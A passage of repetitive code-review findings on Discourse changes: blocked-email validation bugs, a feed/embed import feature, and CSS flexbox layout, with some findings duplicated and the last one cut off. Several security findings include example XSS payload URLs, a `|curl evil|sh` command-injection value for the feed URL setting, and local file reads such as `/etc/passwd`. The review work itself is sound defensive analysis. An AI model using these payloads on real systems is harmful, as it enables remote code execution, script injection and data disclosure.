1. Double counting: `UsersController#create` always calls `user.valid?` (line 168; the `&&` evaluates `valid?` first) and then `user.save` (line 172), which validates again. Every signup attempt for a `do_nothing` email is counted twice.
2. Lost counts: `save`/`save!` run validations inside the record's transaction and raise `ActiveRecord::Rollback` when validation fails. When the email is actually blocked, the increment made during `save` is rolled back. Paths that only call `save!` (e.g. `User.create_for_email` for invites) never record blocked matches at all.

The result is that `match_count`/`last_match_at` are inconsistent and unreliable, which is the stated purpose of these columns. Don't write to the database from inside a validator; record the match explicitly after the create attempt, outside the user's transaction.

title: Blocked-email lookup is an exact, case-sensitive match and is trivially bypassed
body: `BlockedEmail.where(email: email)` compares the raw submitted value. Neither the stored email nor the input is downcased or stripped. If `bad@spammers.org` is blocked, a spammer can register as `Bad@spammers.org` or `BAD@SPAMMERS.ORG` and pass validation. The uniqueness validation on `BlockedEmail.email` is also case-sensitive, so case-variant duplicates can be inserted. Normalize the email (e.g. `Email.downcase(email).strip`) both when storing and when looking up, or compare with `lower(email)`.

title: match_count increment is a racy read-modify-write
body: `should_block?` loads the record, does `record.match_count += 1`, and then calls `record.save`. Concurrent signup attempts for the same email can read the same value and overwrite each other's increment, losing counts. Each save also triggers a uniqueness-validation query. Use an atomic update instead, e.g. `BlockedEmail.where(id: record.id).update_all(['match_count = match_count + 1, last_match_at = ?', Time.zone.now])`.

title: Any server-side email error permanently marks the address as 'invalid' on the client
body: The client pushes the email into `rejectedEmails` whenever `result.errors.email` is present. That includes errors like "has already been taken" or the domain whitelist/blacklist message, not only the new blocked-email error. From then on, the inline validation for that address shows the generic `user.email.invalid` text, which is misleading for the "already taken" case. The address also stays rejected for the rest of the page session, because `rejectedEmails` is never cleared.

title: No tests for the end-to-end blocking or the new create response fields
body: The specs only exercise `EmailValidator#validate_each` with `should_block?` stubbed, and `BlockedEmail.should_block?` in isolation. Nothing verifies that `User` actually rejects a blocked email through `valid?`/`save`. Nothing covers the new `errors`/`values` keys in the `UsersController#create` failure response that the JS now depends on, or the match-count behavior through the real controller flow. The double-count and rollback problems in `should_block?` would have been caught by such tests.

title: Blocked-email match statistics are rolled back when the block causes the save to fail
body:
`BlockedEmail.should_block?` updates `match_count` and `last_match_at` from inside a validator. ActiveRecord runs `save` and `save!` validations inside the record's transaction, and when validation returns false the transaction is rolled back.

In the normal signup path (`user.save` in UsersController#create, `save!` in `create_for_email`), a `:block` match adds an error, the save fails, and the BlockedEmail update is rolled back. The statistics are never recorded for exactly the emails being blocked. Only `:do_nothing` matches, whose saves succeed, or the extra `user.valid?` call made outside a transaction when `call_discourse_hub?` is on, persist counts.

The specs don't catch this because they stub `should_block?` or call it directly, and transactional fixtures swallow the nested `ActiveRecord::Rollback`.

Fix: record the match outside the user's transaction (e.g. a separate connection or a job), or move the bookkeeping out of validation.

title: Blocked email lookup is case-sensitive and unnormalized, so blocks are trivially bypassed
body:
`BlockedEmail.where(email: email)` is an exact string comparison. `User.new_from_params` assigns `params[:email]` as typed, and neither the User model nor BlockedEmail downcases or strips the address.

If `bad@spammers.org` is blocked, signing up with `Bad@spammers.org` or `BAD@SPAMMERS.ORG` passes validation. Mail providers treat these as the same mailbox, so the blocking feature can be defeated with a single uppercase letter.

Fix: normalize with `Email.downcase(email).strip` both when storing BlockedEmail records and when querying, or use a case-insensitive comparison such as `lower(email) = ?`.

title: Non-atomic match_count increment, also inflated by repeated validation calls
body:
`record.match_count += 1; record.save` is a read-modify-write, so concurrent signup attempts with the same email lose increments.

Counts are also inflated because the check runs on every validation pass. UsersController#create calls `user.valid?` and then `user.save` when `call_discourse_hub?` is enabled. For `:do_nothing` emails both passes commit, so a single signup is counted twice.

Fix: use an atomic `BlockedEmail.where(id: record.id).update_all(['match_count = match_count + 1, last_match_at = ?', Time.zone.now])`, and avoid recording side effects from a validator that may run multiple times.

title: Any server-side email error is shown inline as 'invalid email'
body:
`rejectedEmails` is filled whenever the server returns any email error (line 274-275). That includes "has already been taken", the whitelist/blacklist "not allowed from that email provider", and the new "is not allowed".

The inline validation then always shows `I18n.t('user.email.invalid')`, which tells the user their address is malformed when it isn't. That is misleading and contradicts the flash message.

Fix: surface the server-provided reason, e.g. store `result.errors.email` alongside the rejected address and display it.

title: New `errors`/`values` keys in the create response and the User/BlockedEmail integration are untested
body:
The client now depends on `result.errors.email` and `result.values.email` from the failed-signup JSON, but no controller spec asserts these keys are returned.

There is also no User model or controller spec showing that a BlockedEmail actually prevents account creation; the validator spec stubs `should_block?`. A regression in either the response shape or the `validates :email, email: true` wiring would go unnoticed.

title: Match statistics write is rolled back for blocked emails when it runs inside User#save
body: `should_block?` updates and saves `match_count` and `last_match_at` while the User model is validating. `User#save` runs validations inside its own transaction. When the email is blocked, validation fails, `save` returns false, and Rails raises `ActiveRecord::Rollback`, which also rolls back the BlockedEmail update. As a result, blocked attempts that go through `user.save` alone (e.g. when `call_discourse_hub` is off) are never recorded. Those are exactly the hits the statistics are meant to capture. Only the separate `user.valid?` call in the controller, which runs outside a transaction, persists the count. The specs miss this because they call `should_block?` directly. Recording the match outside the validation transaction, or not in a validator at all, would fix it.

title: Validation runs twice per signup, double-counting BlockedEmail matches
body: `create` calls `user.valid?` (when `call_discourse_hub` is on) and then `user.save`, which validates again. Validation now has a side effect: `BlockedEmail.should_block?` increments `match_count` and saves. A matching `do_nothing` entry, whose save succeeds and is not rolled back, is therefore counted twice per signup attempt. Any other code path that calls `valid?` before `save` inflates the counter the same way. Keeping side effects out of validators avoids this.

title: Blocked-email lookup is case-sensitive and unnormalized, so the block is easy to bypass
body: `BlockedEmail.where(email: email)` does an exact, case-sensitive match on whatever the user typed. Neither the stored value nor the input is downcased or stripped. If `block@spamfromhome.org` is blocked, a spammer can register as `Block@SpamFromHome.org` or with surrounding whitespace and pass validation. Normalize both sides, for example with `Email.downcase(...).strip` on save and on lookup, or compare with `lower(email)`.

title: Non-atomic read-modify-write increment of match_count
body: `record.match_count += 1; record.save` reads the row, increments it in Ruby, and writes it back. Concurrent signup attempts with the same email can each read the same value, and the later write overwrites the earlier one, losing increments. Each save also runs the uniqueness validation query. An atomic `BlockedEmail.where(id: record.id).update_all(['match_count = match_count + 1, last_match_at = ?', Time.zone.now])` avoids both problems.

title: Any server-side email rejection is shown inline as 'invalid email'
body: The client adds the email to `rejectedEmails` whenever `result.errors.email` is present. That includes 'has already been taken', the domain whitelist/blacklist message, and 'is not allowed'. The inline reason is then always `I18n.t('user.email.invalid')`. A user whose correctly formatted address is already registered sees a 'please enter a valid email' hint that contradicts the flash error. The message should reflect the server's actual error, e.g. using `result.errors.email`.

title: Unescaped embed URL interpolated into raw-HTML post enables stored XSS
body: The source URL is inserted directly into `#{url}` with no HTML or attribute escaping. The post is then stored with `cook_method: raw_html`, so it is never sanitized. URI parsing accepts `'`, `=`, `(` and `)` in the query, so a URL such as `http:///?x'onmouseover='alert(1)` passes `TopicRetriever#invalid_host?`. Nokogiri parses the result into a real `onmouseover` attribute and keeps it in `to_html`. Anyone can trigger this by calling `/embed/best?embed_url=...` with a spoofed Referer, which leaves a script-bearing post on the forum domain. Escape the URL (e.g. `ERB::Util.html_escape`) or build the link with Nokogiri.

title: raw_html cook method bypasses all HTML sanitization for imported content
body: When `cook_method == raw_html`, `cook` returns `raw` verbatim and skips the normal pipeline that sanitizes HTML. Imported content reaches it unfiltered from two places. The RSS job uses `CGI.unescapeHTML(i.content)`, so `<script>`, `on*` handlers and `<iframe>` from the feed are stored. The Readability import whitelists `href`/`src` attributes, so `javascript:` URLs pass through. That HTML is rendered as-is in the forum and in the embed view (`raw post.cooked`). Any third-party or compromised content in the feed or blog becomes stored XSS on the Discourse origin. The imported HTML should still be run through a sanitizer/whitelist.

title: Kernel#open on admin-supplied feed URL allows command execution / local file read
body: `open(SiteSetting.feed_polling_url)` relies on open-uri's patched `Kernel#open`. That only does an HTTP fetch when the string looks like a `scheme://` URL; otherwise it falls back to plain `Kernel#open`. A value like `|some shell command` runs a subprocess, and `/etc/passwd` reads a local file whose content is then imported as a public topic. The URL is never validated, so an admin (not necessarily a server operator on hosted installs) gets RCE or file disclosure. Use `URI.parse(url).open` or an HTTP client after checking the scheme is http/https.

title: Unauthenticated callers can create unlimited topics by varying the embed URL
body: Any request with a matching Referer (trivially spoofed outside a browser) enqueues `retrieve_topic` for an arbitrary `embed_url`. The only throttle, in `TopicRetriever#retrieved_recently?`, is keyed on the exact URL string. Adding a different query string (`?a=1`, `?a=2`, ...) on the embeddable host therefore bypasses it. Each variant causes a server-side fetch and, if the host returns 200, a new topic via `import_remote`. The job is also enqueued on every hit, including the loading page's 30-second auto-reload. Consider normalizing URLs, rate limiting per IP, and limiting how many new embeds can be created.

title: absolutize_urls corrupts protocol-relative URLs
body: The checks `href.start_with?('/')` and `src.start_with?('/')` also match protocol-relative URLs like `//cdn.example.com/img.png`. `sub(/^\/+/, '')` then strips both slashes and produces `http://bloghost/cdn.example.com/img.png`. Protocol-relative image and CDN links are common in blog/RSS content, so they will be broken in imported posts. Skip values starting with `//`, or resolve properly with `URI.join(url, href)`. The same bug exists in the `img` branch at line 70.

title: Crash when the embedded post has been deleted
body: `post = embed.post` returns nil if a moderator deleted the imported post, because Trashable's default scope hides it. When the feed content later changes, `PostRevisor.new(nil).revise!` raises NoMethodError. `PollFeed` loops over all items without rescue, so one deleted embed aborts processing of every later feed item on every hourly run. Handle a missing post explicitly, e.g. skip it or clean up the embed.

title: TopicEmbed created from a failed post leads to NOT NULL violation
body: `PostCreator#create` returns the post object even when saving failed and rolled back; the post then has `errors` and `id`/`topic_id` are nil. `post.present?` is still true, so `TopicEmbed.create!(topic_id: nil, post_id: nil, ...)` runs. The model validations only check `embed_url`/`content_sha1`, so this reaches the DB and raises on the NOT NULL columns. Check `post.persisted?` / `post.errors.blank?` before creating the embed.

title: RSS items without <content> crash the feed import
body: `i.content.scrub` assumes every item has a `content` element. That holds for Atom, but standard RSS 2.0 items usually carry `description`/`content:encoded` instead, so `i.content` is nil and NoMethodError aborts the whole poll. `String#scrub` also only exists in Ruby 2.1+, and nothing in the Gemfile backports it. Fall back to `description`/`content_encoded` and guard against nil.

title: Non-atomic SETNX + EXPIRE can permanently block retrieval of a URL
body: The throttle calls `setnx` and then `expire` in a separate command. If the process dies or Redis errors between the two calls, the key never expires and that embed URL is treated as 'retrieved recently' forever. Use a single atomic `SET key 1 NX EX 60`.

title: Every retrieval synchronously re-polls and re-imports the entire feed
body: When feed polling is enabled, each cache miss calls `Jobs::PollFeed.new.execute({})` inline. That downloads the whole feed and runs `TopicEmbed.import` for every item. Together with the per-URL throttle (bypassable via distinct URLs), requests for unknown URLs can repeatedly trigger full feed downloads and imports.

title: `<%- end if %>` typo turns the if/else into a modifier conditional
body: `end if` makes the whole if/else block a trailing `if` modifier whose condition is the next compiled ERB statement (the output-buffer append for the following text). The template only renders because that append happens to be truthy. Output is also reordered: the condition is evaluated before the block. This should be a plain `<%- end %>`.

title: postMessage origin check uses substring match
body: `discourseUrl.indexOf(e.origin) === -1` accepts any origin that is a prefix of `discourseUrl`. For example, `http://forum.example.co` passes when discourseUrl is `http://forum.example.com/`. A foreign origin can then send `discourse-resize` messages. Compare `e.origin` exactly against the origin parsed from `discourseUrl`.

title: Disqus import loses --category and thread dates and now depends on live HTTP fetches
body: The `--category` option was removed, so existing invocations that pass `-c` will fail. Topics are no longer created with the thread's original `created_at`. Each thread now calls `import_remote`, which fetches the link over the network. Any 404/timeout raises OpenURI::HTTPError and aborts the whole import. Non-http links make `import` return nil, so those threads are silently skipped.

title: URL/username requirement specs pass trivially
body: `feed_polling_enabled` defaults to false and is not stubbed to true in the 'requires feed_polling_url' and 'requires embed_by_username' examples. `poll_feed` is therefore never called no matter what the URL or username checks do, so these tests do not verify the conditions they describe. Stub `feed_polling_enabled?` (and the other setting) to true in each case.

title: 'is 404 without an embed_url' never reaches the param check
body: `embeddable_host` is blank by default, so `ensure_embeddable` raises InvalidAccess (403) before `params.require(:embed_url)` runs. The example only asserts `should_not be_success`, so it passes without exercising the missing-parameter path its name describes. There is also no coverage for a referer whose host doesn't match.

title: Unrelated edit of an already-shipped migration adding force: true
body: This PR changes an existing migration to `create_table :top_topics, force: true`. Editing a released migration has no effect where it has already run. Where it hasn't, it now silently drops any existing `top_topics` table. The new `create_topic_embeds` migration uses `force: true` the same way. The change is unrelated to embedding and should be reverted.

title: embed_url limited to varchar(255)
body: `t.string :embed_url` creates a varchar(255) column. Article URLs with long slugs or query strings can exceed this, and PostgreSQL then raises 'value too long' during `TopicEmbed.create!`. That fails the import job, or aborts the feed loop. Use `text`, or validate/truncate the length.

title: Embed URL interpolated unescaped into HTML, enabling stored XSS that unauthenticated users can trigger
body: `import` appends `#{url}` with no HTML escaping. The post uses `cook_method: raw_html`, so this HTML is stored and rendered verbatim in the forum and in the embed view. `url` can come from the public `embed/best?embed_url=...` parameter. The only checks are that the host equals `embeddable_host` and that `URI()` parses it. RFC 3986 permits `'`, `(`, `)`, `;` and `=` in paths and queries, so a URL like `http://host/?x='onmouseover='alert(document.cookie)'style='...` passes. Most sites return 200 for unknown query strings, so `import_remote` fetches it and creates a topic. Nokogiri then parses the injected attribute as real markup. Result: an unauthenticated attacker gets JavaScript running on the forum origin. Escape the URL (`ERB::Util.html_escape` / `CGI.escapeHTML`) and sanitize the whole imported HTML.

title: raw_html cook method bypasses all sanitization
body:
When `cook_method == raw_html`, `cook` returns `raw` untouched, so the PrettyText sanitizer is skipped.

Affected content:
- RSS content from `PollFeed`: `CGI.unescapeHTML(i.content)` is passed straight in, so `<script>`, event handlers and iframes survive.
- Readability output from `import_remote`: it allows `href`/`src` attributes, so `javascript:` URLs survive.
- Any later edit of the post through the normal editor. The post keeps `raw_html`, so whoever can edit it (the `embed_by_username` user, who need not be staff, and staff) can inject arbitrary script.

This content is rendered with `raw` in `best.html.erb` and as cooked HTML in the main Discourse UI, i.e. on the forum origin. Raw HTML posts should still go through a whitelist sanitizer.

title: Anyone can make the server fetch pages and create topics for arbitrary URLs on the embeddable host
body:
The only gate is a Referer header check, which is trivially spoofed outside a browser (e.g. curl). After that, any `embed_url` on the embeddable host triggers a `retrieve_topic` job. Throttling is per exact URL string, so `?a=1`, `?a=2`, ... each cause an outbound HTTP fetch and a new topic.

When feed polling is enabled, each new URL also triggers a full synchronous feed poll. The loading page reloads every 30 seconds forever for every viewer, enqueueing another job each time.

This lets unauthenticated users spam topics and load the server. Consider normalizing URLs, a global rate limit, and only creating topics for URLs that actually appear in the feed or are explicitly allowed.

title: Kernel#open on an admin-supplied URL allows command execution and local file reads
body:
`open(SiteSetting.feed_polling_url)` uses `Kernel#open` via open-uri.

- A value starting with `|` (e.g. `|curl evil|sh`) runs a shell command on the server.
- A plain path like `/etc/passwd` or `config/database.yml` is read from local disk and imported as a public topic.

This turns the admin settings panel into RCE / arbitrary file disclosure. `TopicEmbed.import_remote` (`open(url).read`) has the same pattern and no scheme check before opening. Neither call sets a timeout, so a slow host can also tie up a Sidekiq worker indefinitely.

Use `URI.parse(url).open` after validating the scheme is http/https, or use an HTTP client with timeouts.

title: Feed import crashes on items without <content> and on Ruby < 2.1
body:
`i.content.scrub` assumes every item has a content element. Many RSS 2.0 feeds only provide `<description>`, so SimpleRSS returns nil for `content` and this raises `NoMethodError` on nil. That exception aborts the whole `rss.items.each` loop, so no items are imported.

Separately, `String#scrub` only exists from Ruby 2.1. On the Ruby 1.9.3/2.0 versions Discourse supported at the time it raises `NoMethodError` for every item.

Fall back to `description`, guard against nil, and use an encoding-safe alternative to `scrub`.

title: Updating an embed whose post was deleted raises on nil and permanently breaks that embed
body:
On the update path, `post = embed.post` then `PostRevisor.new(post).revise!(...)`. Post uses the Trashable default scope, so if a moderator deletes the imported post, `embed.post` is nil.

The next feed poll then raises `NoMethodError`, and because there is no per-item rescue, every later item in the feed is skipped on every poll.

The TopicEmbed row still points at the deleted topic, so `topic_id_for_embed` keeps returning it. `TopicView` then raises NotFound, and the embed shows an error forever without re-importing. Handle a missing/deleted post: skip it, or remove the stale embed row.

title: absolutize_urls corrupts protocol-relative URLs
body:
Any `href`/`src` starting with `/` is rewritten as `"#{prefix}/#{href.sub(/^\/+/, '')}"`. A protocol-relative URL such as `//cdn.example.com/img.png` (very common for images and CDN assets) becomes `http://embeddable-host/cdn.example.com/img.png`, which breaks images and links in imported posts.

Fix: skip values starting with `//`, or better, resolve every link with `URI.join(url, href)`. That would also handle relative paths without a leading slash, which the comment claims to support but the code does not.

title: PostCreator failure not detected; nested transaction defeats PostCreator's rollback
body:
`PostCreator#create` returns the unsaved `@post` even when saving failed, so `post.present?` is true. `TopicEmbed.create!` then runs with `post_id: nil` and hits the NOT NULL constraint, raising a database error instead of failing gracefully.

Also, `PostCreator` signals failure by raising `ActiveRecord::Rollback` inside `Post.transaction`. Nested inside the outer `Topic.transaction` without `requires_new`, that Rollback is swallowed by the inner block and does not roll anything back. The topic created by TopicCreator is only undone here by the accident of the later NOT NULL error.

Check `post.persisted?` / `creator.errors` and avoid the outer transaction, or use `requires_new: true`.

title: Disqus import regresses: category option and original dates dropped, aborts on any dead link
body:
The `--category` option and the per-topic `created_at` from the Disqus export were removed, so imported topics land uncategorized and dated at import time.

The task now calls `TopicEmbed.import_remote`, which does a live HTTP fetch of every thread link with no error handling. Any thread whose original page now returns 404 or is unreachable raises `OpenURI::HTTPError` or a socket error and aborts the entire import midway.

The import also now requires network access to the source site.

title: Feed import is subject to normal user rate limits
body:
`PollFeed` creates one topic per feed item in a tight loop as `embed_by_username`, but does not disable `RateLimiter`. The Disqus importer does disable it.

`skip_validations` does not bypass the `rate_limit` callbacks on Post/Topic. If the configured user is not staff, the second item hits `rate_limit_create_topic` / `max_topics_per_day` and raises `RateLimiter::LimitExceeded`. That aborts the rest of the feed on every hourly run.

The setting description does not tell admins that the user must be staff. Either disable rate limiting for imports or document and enforce a staff user.

title: Every uncached embed URL triggers a full synchronous feed poll
body:
`perform_retrieve` calls `Jobs::PollFeed.new.execute({})` inline whenever a URL has no embed yet. Each distinct unknown URL re-downloads and re-processes the entire feed, hashing and comparing every item, on top of the hourly scheduled poll.

Combined with the publicly reachable endpoint and the 30-second auto-reload of the loading page, this multiplies outbound requests and DB work.

title: Non-atomic setnx + expire can block a URL from ever being retrieved
body:
`$redis.setnx(key, '1')` followed by a separate `$redis.expire(key, 60)` is not atomic. If the process dies or Redis errors between the two calls, the key never expires. Every later non-staff request for that URL is then treated as "retrieved recently" forever.

Use `$redis.set(key, '1', nx: true, ex: 60)`.

title: Stray `end if` turns the header block into a modifier-if on the next template statement
body:
`<%- end if %>` compiles to Ruby `end if` followed by a newline. Ruby treats the next generated statement (the following `@output_buffer.safe_append=...`) as the condition of a trailing `if` modifier.

It renders today only because that assignment returns a truthy string, and it reorders output: the whitespace is appended before the button. Depending on what follows, it can also yield a syntax error. Should be `<%- end %>`.

Controller specs don't render views, so this isn't caught.

title: postMessage origin check uses substring matching
body:
`discourseUrl.indexOf(e.origin) === -1` accepts any origin that is a substring of `discourseUrl`. For example, with `https://forum.example.com.au/`, messages from `https://forum.example.com` are accepted.

Today the only effect is that a foreign frame can resize the iframe, but it is the wrong primitive for an origin check. Compare `e.origin` exactly against the origin parsed from `discourseUrl`.

title: Existing migration edited to add force: true
body:
This migration has already been run on existing installs. Editing it does nothing there, but anyone re-running it (or running it on a DB where the table exists) will silently drop `top_topics`.

The new `create_topic_embeds` migration also uses `force: true`, which would drop an existing `topic_embeds` table and its data. Neither change is needed; existing migrations should not be modified.

title: Adding NOT NULL column with default rewrites the posts table
body:
On the PostgreSQL versions in use at the time (pre-11), `add_column ... default: 1, null: false` rewrites the entire `posts` table under an exclusive lock. On large forums this blocks all reads and writes to posts for the duration of the migration.

The usual safe pattern is: add the column nullable, backfill in batches, then add the default and NOT NULL.

title: URL and username requirement tests pass trivially
body:
The "requires feed_polling_url" and "requires embed_by_username" examples stub only the setting under test. `feed_polling_enabled` defaults to false, so `poll_feed` is never called regardless of the URL or username. These tests would still pass if the `feed_polling_url` / `embed_by_username` checks were removed.

They should stub `feed_polling_enabled?` to true and the other settings to valid values. There are also no tests for `poll_feed` itself or `import_remote`.

title: "is 404 without an embed_url" actually tests the missing host check
body: With no `embeddable_host` configured, `ensure_embeddable` raises InvalidAccess (403) before `params.require(:embed_url)` is reached. The example only asserts `should_not be_success`, so it never exercises the missing-parameter path its name describes, and it duplicates the next test. Stub a valid host and referer to actually test a missing `embed_url`.

title: New gems added only to the Rails 4 lockfile
body: `ruby-readability` and `simple-rss` (plus `guess_html_encoding`) were added to `Gemfile_rails4.lock` only. The Gemfile still supports Rails 3 dual-boot via `Gemfile.lock`, which was not updated. Deployment-mode bundling under `RAILS3=1` will fail or resolve unpinned versions.

title: Embed URL interpolated unescaped into raw-HTML post: stored XSS reachable anonymously
body: `import` builds `#{url}` with no HTML escaping. The result is stored as a `raw_html` post, which is never sanitized and is rendered directly in the forum and the embed view. `url` can come from the anonymous `embed_url` param via EmbedController → RetrieveTopic → TopicRetriever. The only check there is that `URI(url).host == embeddable_host`, and Ruby's RFC2396 URI parser accepts `'`, `(`, `)` and `=` in path and query. Example: `http://blog.example/real-post?x='onmouseover='alert(1)'` parses with the correct host. Most blogs return 200 for unknown query params. Nokogiri then re-serializes the broken markup into a real `onmouseover` attribute. Result: an unauthenticated visitor with a spoofed Referer can plant script in a forum topic. Escape `url` (e.g. `ERB::Util.html_escape`) before interpolating it, and sanitize imported HTML.

title: raw_html cook_method permanently bypasses sanitization, including for later user edits
body:
`Post#cook` returns `raw` verbatim whenever `cook_method == raw_html`. The flag is persisted on the post, and `before_save` re-cooks on every update.

Any later edit through the normal edit UI/API therefore stores arbitrary unsanitized HTML, `<script>` included, in `cooked`. That applies to the post owner (the `embed_by_username` account, which need not be staff) and to any staff editor. This is a stored-XSS primitive for whoever controls that account.

Feed and Readability content (which keeps `href`/`src` and therefore `javascript:` URLs) is likewise never sanitized. Raw HTML should still go through a sanitizer/whitelist, and normal edits should not inherit the bypass.

title: Anonymous requests can enqueue unlimited jobs and create unlimited topics
body:
Every request to `/embed/best` for an unknown `embed_url` enqueues a `RetrieveTopic` job, and `loading.html.erb` reloads every 30s, so each viewer enqueues another job each time. The only gate is the Referer header, which non-browser clients can trivially set.

The throttle in TopicRetriever is keyed on the exact URL string. An attacker can vary the query string (`?a=1`, `?a=2`, …) on any real page of the embeddable host. Each variant triggers a synchronous full `PollFeed` run plus an HTTP fetch, and if the host returns 200, a brand new topic.

Result: unlimited anonymous topic spam, Sidekiq flooding, and request amplification against the blog. Legitimate tracking params (utm_*) also produce duplicate topics. Consider normalizing URLs, throttling per client/host, and not enqueuing on every request.

title: `i.content.scrub` crashes on standard RSS feeds and on Ruby < 2.1
body:
SimpleRSS only populates `content` for feeds that have a `<content>` element (Atom). Standard RSS 2.0 items carry their body in `<description>` or `<content:encoded>` (`content_encoded`), so `i.content` is nil and `nil.scrub` raises NoMethodError, aborting the whole poll.

The setting text advertises "RSS/ATOM feed", so RSS feeds would simply never import.

Separately, `String#scrub` only exists in Ruby 2.1+. Under Ruby 1.9.3/2.0 this raises for every item, including Atom feeds.

title: One failing feed item aborts the entire import loop, every hour
Deleted embedded post causes NoMethodError on update path
body:
When a moderator deletes an imported topic or post, the `TopicEmbed` row remains, but `embed.post` returns nil because Trashable's default scope hides deleted posts.

The next import of that URL with changed content calls `PostRevisor.new(nil).revise!`, which raises NoMethodError. In `PollFeed` this also aborts processing of all subsequent items.

In addition, `EmbedController` keeps finding the stale `topic_id` and `TopicView` raises NotFound, so the embed shows an error forever instead of recreating or hiding the discussion. Handle a missing post/topic (skip it, or remove/recreate the embed).

title: Check-then-create race on embed_url; side effects fire for rolled-back topics
body:
`import` looks up `TopicEmbed.where(embed_url: url).first` and creates if absent, with no lock. Two runs for the same URL can both see nothing:
- the scheduled PollFeed racing a RetrieveTopic, which itself runs PollFeed synchronously;
- two un-throttled staff retrievals.

In that case the second `TopicEmbed.create!` hits the unique index and raises, rolling back the outer `Topic.transaction`.

However, PostCreator runs `enqueue_jobs`, `MessageBus.publish` and `TopicTrackingState.publish_new` before that outer transaction commits. Clients are notified of, and Sidekiq jobs target, a topic and post that never existed.

Also, `ActiveRecord::Rollback` raised inside PostCreator's nested `Post.transaction` is swallowed when nested like this. For example, a host-spam rejection then surfaces only as a later NOT NULL violation on `post_id`.

title: Kernel#open on admin-configured URL allows shell command execution
body:
`open(SiteSetting.feed_polling_url)` uses Kernel#open. If the value is not recognized as a URI by open-uri, it falls back to Kernel#open, and a value starting with `|` is executed as a shell command.

That turns a site setting editable from the admin UI into arbitrary command execution on the server. It also allows reading local files by path.

Validate that the setting is an http(s) URL and use `URI.parse(url).open` (or an HTTP client) instead of bare `open`.

title: Disqus import regressions: --category removed, original dates lost, fragile network dependency
body:
This change makes three regressions in the Disqus import task:
- The `--category` option is removed, so existing usage that passed `-c` now fails or silently ignores it.
- Topics no longer get `created_at` from the Disqus thread, so imported topics are dated at import time.
- Every thread now requires an HTTP fetch of `t[:link]` via `import_remote`. Any fetch error (404, timeout, DNS) raises and aborts the whole import with no per-thread recovery.

Also, links that are not `https?://` cause `import` to return nil after the fetch, so those threads and their comments are skipped silently.

title: absolutize_urls mangles protocol-relative URLs
body:
The check `href.start_with?('/')` also matches protocol-relative URLs such as `//cdn.example.com/img.png`. `sub(/^\/+/, '')` then strips both slashes, producing `http://blog.host/cdn.example.com/img.png`, which breaks every protocol-relative image and link in imported content. The same applies to `src` on line 70.

The port check on line 59 also compares against both 80 and 443 regardless of scheme, so `http://host:443` or `https://host:80` lose their port. Use `URI.join(url, href)` instead.

title: Referer interpolated into a JavaScript string with HTML escaping only
body:
`'<%= request.referer %>'` places a client-supplied header inside a JS string literal using ERB's HTML escaping. That is the wrong context: backslashes and other JS metacharacters are not escaped, and HTML entities are not decoded inside `<script>`.

A crafted referer can at minimum break the script. Use `escape_javascript`, or better, pass only the origin of the validated embeddable host rather than the raw header.

title: postMessage origin check uses substring match
body:
`discourseUrl.indexOf(e.origin) === -1` accepts any origin that is a substring of `discourseUrl`. If the forum is `http://forum.example.com.au/`, the owner of `forum.example.com` passes the check and can send `discourse-resize` messages.

The impact is limited to resizing the iframe, but the check should compare exact origins, e.g. against an origin parsed from `discourseUrl`.

title: Non-atomic SETNX + EXPIRE can permanently throttle a URL
body: `setnx` followed by a separate `expire` is not atomic. If the process dies or Redis errors between the two calls, the key never expires, and that `embed_url` is never retrieved again for non-staff visitors; the iframe keeps showing the loading page. Use `SET key 1 NX EX 60` in a single command.

title: Precondition specs pass vacuously
body:
The "requires feed_polling_url" and "requires embed_by_username" examples do not stub `feed_polling_enabled?` to true. That setting defaults to false, so `poll_feed` is never called regardless of the URL or username check, and these tests would still pass if those conditions were removed.

Similarly, `embed_controller_spec`'s "is 404 without an embed_url" fails on the missing embeddable host (403) rather than the missing param. There are also no tests for `retrieved_recently?`, `PollFeed#poll_feed`, or the HTML-escaping of imported content.

title: `<%- end if %>` typo only works by parser accident
body: `end if` is a modifier-if with no condition on the same line. Ruby takes the next generated statement (the `@output_buffer.safe_append=` of the following template text) as the condition. It happens to evaluate truthy, so the template renders, but it depends on how the template compiler emits code and is fragile. It should be `<%- end %>`.

title: Small-action buttons are no longer right-aligned after switching .small-action to flexbox
body:
.small-action is now a flex container (line 264). Its .small-action-desc child has no flex-grow, so it shrinks to the width of its text instead of spanning the row. The old 4em left padding that made it a full-width block is also gone.

The .small-action button rule (lines 306-310) still uses `float: right`. If the buttons sit inside .small-action-desc, they now float to the right edge of a narrow content-sized box. If they are direct children of .small-action, floats are ignored on flex items. Either way, the delete/edit buttons on small action posts move next to the description text instead of the right edge of the post.

Fix: give .small-action-desc `flex: 1 1 auto` (plus the -webkit-box-flex/-ms-flex equivalents), or use `margin-left: auto` on the buttons instead of the float.

title: Header extra-info flex item can't shrink below its content width; long titles may push the panel out
body:
.extra-info-wrapper is now a flex item of `.d-header .contents`. Its min-width defaults to `auto`, and nothing in this change sets `min-width: 0`, `overflow: hidden` or flex-shrink behaviour on it.

When the docked header shows a long, non-wrapping topic title, the item's minimum width becomes the full title width. It then won't shrink, and the `.panel` with the notification/user icons (order 3, `margin-left: auto`) is pushed past the right edge of the header. Previously the floated layout constrained this.

Fix: add `min-width: 0` (or `overflow: hidden`) and an explicit flex basis/shrink to .extra-info-wrapper.

title: Legacy-prefix mixins pass modern values verbatim to old-spec properties with different semantics
body:
`align-items($alignment)` copies its argument into `-webkit-box-align` and `-ms-flex-align`. Those legacy properties accept `start`/`end`, not `flex-start`/`flex-end`, so any future caller using those values emits invalid declarations for the browsers the prefixes target. `-ms-align-items` is not a real property and is dead output.

`order($val)` has the same problem: `-webkit-box-ordinal-group`/`-moz-box-ordinal-group` are 1-based (default 1, values must be >= 1), while `order` defaults to 0. As a result, `order(0)` or negative values are invalid in the legacy model, and `order(1)` orders elements differently in legacy vs. modern browsers.

The current callers (center, baseline, 2, 3) happen to work. The mixins should map the values, or document that they only accept safe values.

title: Float layout removed, but legacy -webkit-box fallback can't right-align the panel with auto margin
body:
The change removes `.title { float: left }` and `.panel { float: right }` and relies on `margin-left: auto` on .panel to push it to the right.

The flexbox mixin explicitly emits `display: -webkit-box` / `-moz-box` for old-spec-only browsers. The 2009 box model does not support auto margins for main-axis distribution; it uses box-pack or box-flex instead. In those browsers the panel would sit immediately after the title/extra-info instead of at the right edge. Browsers without flexbox at all get a stacked header, since no float fallback remains.

Either drop the legacy box prefixes, or add a legacy-compatible way to push the panel right (for example a flexing spacer, or box-flex on .extra-info-wrapper).

title: Small-action edit/delete buttons lose right alignment once `.small-action` becomes a flex container
body:
`.small-action` is now `display: flex`, but its layout still assumes block flow.

